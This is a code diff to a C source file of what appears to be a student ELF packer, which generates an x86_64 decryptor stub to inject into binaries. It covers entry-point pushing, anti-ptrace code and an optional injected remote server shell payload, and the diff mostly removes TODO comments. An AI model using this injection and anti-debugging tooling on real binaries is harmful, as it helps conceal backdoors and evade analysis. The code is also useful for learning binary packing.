@@ -75,12 +75,6 @@ static inline uqword get_decryptor_size_x86_64(const parse_t* const in, const cr
 	/* Total amount if chunks */
 	size += OP_MOV_IMM_TO_REG_SIZE + OP_PUSH_RAX_SIZE;
 
-	/* End jump */
-	//size += OP_JUMPN_SIZE;
-
-	/* Return */
-	//size += OP_RETN_SIZE;
-
 	if (in->opts & O_ANTIPTRCE)
 		size += ARRLEN(antiptrace_x86_64);
 
@@ -97,7 +91,6 @@ static inline void memcpy_offset(ubyte* const restrict dest, const ubyte* const 
 	ft_memcpy(dest + *offset, src, nbytes);
 	*offset += nbytes;
 }
-
 
 __attribute__ ((always_inline))
 static inline void mov_key_to_rdi(ubyte* const dest, uqword* const offset, uqword key)
@@ -118,7 +111,6 @@ static inline void push_entry_point(ubyte* const dest, uqword* const offset, uqw
 
 	const udword* const ep = (const udword*)&entry_point;
 
-	///TODO: Follows same TODOs than build_stack_initializer_x86_64
 	ubyte op_mov_mem_to_rsp[OP_MOV_IMM_TO_MEM_SIZE] = {
 		OP_MOV_IMM_TO_MEM, OP_MOV_MEM_RSP, 0x0, 0x0, 0x0, 0x0
 	};
@@ -142,16 +134,9 @@ __attribute__ ((always_inline))
 static inline void build_stack_initializer_x86_64(ubyte* const dest, uqword* const offset,
 		const crypt_pair_t* const targets, uqword key)
 {
-	///NOTE: Depending of the endianess movabs, reg, imm could be \xb8\x48 or \x48\xb8 (99% sure)
-	///NEED: movabs rax, imm64
-	///NOTE: All this file is tested by writing *dest array into a file F and then do the command: 'cat F | hexdump -v -e '/1 "%02X "' ; echo'
-	/// The output is dissasembled in the following page: https://defuse.ca/online-x86-assembler.htm#disassembly
 	ubyte op_mov_push[OP_MOV_IMM_TO_REG_SIZE + OP_PUSH_RAX_SIZE] = {
 		OP_REG_RAX, OP_MOV_IMM_TO_REG, 0X0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, OP_PUSH_RAX
 	};
-
-	///NOTE: Also the order of the imm64 can be reversed by endianess:
-	/// Eg: 0x1122334455667788 -> {8877665544332211} OR {1122334455667788}
 
 	register uqword* const imm64 = (uqword*)(op_mov_push + 2);
 
@@ -202,7 +187,7 @@ static inline void	target_fixup(crypt_pair_t* const targets,
 {
 	for (uqword i = 0; i < PAIRARR_LEN; i++)
 	{
-		// if the chunk to decrypt starts after or at the decryptor's offset
+		/* if the chunk to decrypt starts after or at the decryptor's offset */
 		if (targets[i].type == CH_SEGMENT
 		&& (uqword)targets[i].start >= decryptor->vaddr)
 		{
@@ -225,12 +210,7 @@ static inline void	target_fixup(crypt_pair_t* const targets,
 err_t build_decryptor_x86_64(decryptor_t* const dest, const parse_t* const in,
 		crypt_pair_t* const targets, uqword ep)
 {
-	//uqword payload_size;
 	uqword offset = 0;
-
-	///TODO: Push EP at the begin return to it at the end
-	///TODO: Probally for test RETN is needed but whether the injected decryptor returns to another segment RETF will be necesary
-	/// https://stackoverflow.com/questions/1396909/ret-retn-retf-how-to-use-them
 
 	target_fixup(targets, dest);
 	dest->size = get_decryptor_size_x86_64(in, targets);
@@ -241,8 +221,6 @@ err_t build_decryptor_x86_64(decryptor_t* const dest, const parse_t* const in,
 		return EWRAPPER;
 	}
 
-	(void)ep;
-	///TODO: Uncomment this to push the entry point at the begin
 	push_entry_point(dest->data, &offset, ep);
 
 	memcpy_offset(dest->data, regs_preservation_x86_64, ARRLEN(regs_preservation_x86_64), &offset);
@@ -252,28 +230,13 @@ err_t build_decryptor_x86_64(decryptor_t* const dest, const parse_t* const in,
 
 	if (in->opts & O_REMOTE_SH)
 	{
-		///TODO: This otion doesn't work yet because there is a ret in the decriptor, this function should be called before the ret of the decryptor
 		mov_key_to_rdi(dest->data, &offset, in->key);
 		memcpy_offset(dest->data, remote_serv_shell_x86_64, ARRLEN(remote_serv_shell_x86_64), &offset);
 	}
 
 	build_stack_initializer_x86_64(dest->data, &offset, targets, in->key);
 
-	//payload_size = ARRLEN(decryptor_x86_64);
 	memcpy_offset(dest->data, decryptor_x86_64, ARRLEN(decryptor_x86_64), &offset);
-
-
-
-	//memcpy_offset(*dest, (ubyte[OP_JUMPN_SIZE]){OP_JUMPN, payload_size}, OP_JUMPN_SIZE, &offset);
-
-	//memcpy_offset(*dest, regs_restoration_x86_64, ARRLEN(regs_restoration_x86_64), &offset);
-
-	//memcpy_offset(*dest, (ubyte[]){OP_RETN}, OP_RETN_SIZE, &offset);
-
-
-
-	///NOTE: Maybe 'retf' is needed isntead of 'retn'
-	//memcpy_offset(*dest, (ubyte[]){OP_RETF}, OP_RETF_SIZE, &offset);
 
 	return SUCCESS;
 }
